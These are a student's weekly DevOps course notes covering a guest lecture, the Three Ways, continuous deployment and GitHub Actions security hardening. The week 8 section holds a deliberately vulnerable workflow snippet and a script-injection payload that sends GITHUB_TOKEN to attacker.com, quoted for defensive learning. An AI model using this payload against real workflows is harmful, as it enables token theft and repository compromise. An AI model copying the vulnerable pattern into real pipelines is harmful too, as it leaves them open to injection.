# Devops uge 1

- Dependency graph design
  - I worked with dependency graph to create an overview of the dependencies my project has.

# Devops uge 2

# Devops uge 3

# Devops uge 4

# Devops uge 5

# Devops uge 6

## Guest lecture from Eficode

- Sofus og Kasper er kommet på besøg
- Eficode speciliaser sig kun i DevOps

- Summary

  - Fast Feedbak is important
  - Teams must be able to work independently. They should still take responsiblity
  - The agile mindset is continous improvement

- Notes

  We are software engineers because we built blueprints for our work, but are like other engineers ?
  When it comes to software it is easier to be agile, than hardware.
  It is dangerous to think you know better than the users who work in their domain.
  As a software engineer you can work in a domain for several years, and think you know it all, but that is dangerous. In the end you are still a software engineer, and a sales man in the car industry know their domain better than you, so you must always take their input. However, not every user input is valuable but some are. Just take that into consideration.

  You cannot use devops in the waterfall model.

  DevOps and software engineers have different roles. They might not even use the same tools.

# Devops uge 7

Weekly devOps principle is the end to end responsiblity as in Dev and Ops must become 1.

We have to remember to be critical of the tools we use.

Static code analysis: Analyzing the code without executing it
Dynamic code analysis: Analyzing the code executing it

We can show our static score analysis if we are critical about it.

DevOps is a approach and a culture.
You also have to be critical of your approach and figure out improve it.

DevOps Handbook is something that will asked for your exam.

Consider while reading the material, how your group applies these principles.

     - Flow
     - Feedback
     - Continual Learning and Experimentation

## The Three Ways (Detailed Explanation):

The "Three Ways" are foundational principles underpinning DevOps practices, promoting effective flow, continuous feedback, and constant learning.

1. The First Way - Flow

   Direction: Left-to-right (Development → Operations → Customer).

   Goal: Improve the smooth and rapid movement of work through the pipeline.

   Methods:
   Making all work visible.
   Reducing batch sizes (small, frequent changes).
   Limiting Work in Process (WIP) to enhance efficiency.
   Embedding quality from the start to avoid passing defects downstream.
   Result: Shorter deployment lead times (from months to minutes), higher throughput, faster value delivery.

2. The Second Way - Feedback

   Direction: Right-to-left (Operations → Development).

   Goal: Facilitate rapid feedback on every stage of the value stream to quickly detect and fix issues.

   Methods:
   Immediate feedback mechanisms (e.g., automated testing, continuous integration).
   Swarming on problems to prevent recurrence.
   Result: Improved quality, reduced failure rates, and systems that are safer to change due to earlier detection and rapid correction of issues.

3. The Third Way - Continual Learning and Experimentation

   Goal: Create a culture of experimentation, high trust, continuous learning, and innovation.

   Methods:

   Encouraging risk-taking within safe boundaries.
   Designing systems for rapid learning from both successes and failures.
   Sharing knowledge across the organization to enhance collective improvement.
   Result: An adaptive organization that learns quickly and continually improves, thereby staying competitive and resilient.

#### information silos vs knowledge silos

information silos: Departments are isolated from each other and do not share data or information

knowledge silos: expertise is isolated is not shared across teams or individuals.

#### Two on going tracks

Technical tracks

DevOps principle

---

The andon cord means everyone swarms a problem, and it gives a good yield when programming and solving problems.

---

If a major incident occurs you can make a blameless postmortem.

## Continous Deployment

Continous delivery = Vi pakker vores produkt ind og gøre det til en artifakt
Continous Deployement = Vi pusher vores artifakt i skyen.

We have to achieve full continous deployement.

Instead of having our github repository in the server we can make it as a image
(Read the slides) and make a docker image which you push to docker hub. Create a workflow that will run each time you push and a workflow will run which also triggers in the server that gets the newest version of the codebase.
Create a workflow

- Have your image loaded up in docker hub everytime you update your code

#### Quality gates

You can have jobs on your workflows that tests the quality of your gates.
You can use the needs keywords to ensure that job A and job B is successfull before it can proceed.

## GitOps

GitOps is a way of implementing Continuous Deployment for cloud native applications.

# DevOps Uge 8

## Before class

[Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)

This is for securing your github actions. There are many ways you can secure your repository by following the link above. I have linked the resource above:

So far I have written down the parts that can be relevant for our own project:

When working with secrets always hide them so other users can not access them [Sealed boxes](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes)

- Do not use structured data to hide your datasets (JSON/YAML/XM) because it uses exact matches only
  It is easier to use single variables such as SUPER_SECRET_TOKEN=123 and not {"user":"x","pass":"y"} like in structured datasets

### Register all secrets used within workflows

- Manually review and verify how your secrets are being used in your GitHub Actions workflows
  - Make sure secrets (like ${{ secrets.MY_SECRET }}) are only used where they're needed.
  - Dont send your secret to random API's you dont know about
  - Ensure that they are not printed into logs [Logs](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs#deleting-logs)
    - You can test it like this for example to ensure it is not printed in the logs `run: echo "Using password ${{ secrets.DB_PASS }}`
  - Use credentials that are minimally scoped
    - Such that other users that have access to your repository have the minimum access to read, write and execute
  - Audit and rotate registered secrets
    - Ensure that the secrets you have are always up to date and that they are still useful. If they are not then remove them.

### CODEOWNERS

- You can use codewners feature to ensure who can edit your workflow files [Link](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners)

### Dependeabot

- Use Dependabot: Enable Dependabot to automatically check for and update vulnerable dependencies in your workflows, ensuring you're using the latest secure versions.

### 🛡️ Script Injection Risk in GitHub Actions – Summary

- 🚨 What’s the risk?

  - GitHub Actions may accidentally execute **untrusted input** as code.
  - Attackers can inject commands through:
    - Pull request titles
    - Issue bodies
    - Branch names
    - Email addresses
    - Other `github.event.*` fields (e.g. `github.event.pull_request.body`)

- 🧨 How it happens

  - Values inside `${{ github.event.* }}` are **evaluated and substituted** before a shell script runs.
  - If those values are used directly in `run:` steps, they can **inject shell commands**.

- ❌ Vulnerable Example
  ```yaml
  - name: Check PR title
    run: |
      title="${{ github.event.pull_request.title }}"
      if [[ $title =~ ^octocat ]]; then
        echo "PR title starts with 'octocat'"
      fi
  ```

### 🛡️ Stealing the Job's `GITHUB_TOKEN` – Summary

- ⚠️ Risk:

  - Every GitHub Actions job automatically receives a temporary `GITHUB_TOKEN`.
  - This token:

    - Is scoped to the current repository.
    - Expires after the job ends.
    - Grants permission to perform actions within the repo (e.g., push, create issues).

  - 🚨 How an attacker can exploit it:
    - If they manage to inject code into a workflow (e.g., via script injection),
    - They can exfiltrate the token quickly using a command like:
      ```bash
      a"; set +e; curl http://attacker.com?token=$GITHUB_TOKEN; #
      ```
    - Limit GITHUB_TOKEN permissions using permissions: in your workflow if possible.

---

## 🔐 Accessing Repository Data in GitHub Actions – Best Practices

This list ranks the safest and most appropriate ways to access repository data in workflows:

---

### ✅ 1. `GITHUB_TOKEN` (Recommended)

- Automatically generated for each job.
- Scoped only to the repo running the workflow.
- Expires after the job finishes.
- Should be used **whenever possible**.

---

### ✅ 2. **Repository Deploy Key**

- SSH key tied to a **single repository**.
- Grants **read/write Git access** only (no API access).
- Ideal for cloning/pushing between specific repos.
- Not usable with REST or GraphQL APIs.

---

### ✅ 3. **GitHub App Token**

- GitHub Apps can be installed with **granular access**.
- Good for accessing multiple repos securely.
- Authenticate as the app installation in your workflow.
- Suitable for API and advanced access use cases.

---

### ⚠️ 4. **Personal Access Token (PAT)**

- **Avoid using classic PATs**:
  - Grants **broad access** to all repos the user has access to.
  - Breaks if the user leaves the org.
- If absolutely needed:
  - Use a **fine-grained PAT** tied to a bot account.
  - Limit access to specific repos only.

---

### ❌ 5. **SSH Keys on a Personal Account**

- Should **never** be used in workflows.
- Grants access to **all personal and org repos**.
- Similar risk profile to PATs but harder to control.
- Use **deploy keys instead** if Git-only access is required.

---

> 🔐 Always prefer minimal, scoped credentials to reduce risk. Use `GITHUB_TOKEN` when possible, and avoid using personal credentials.
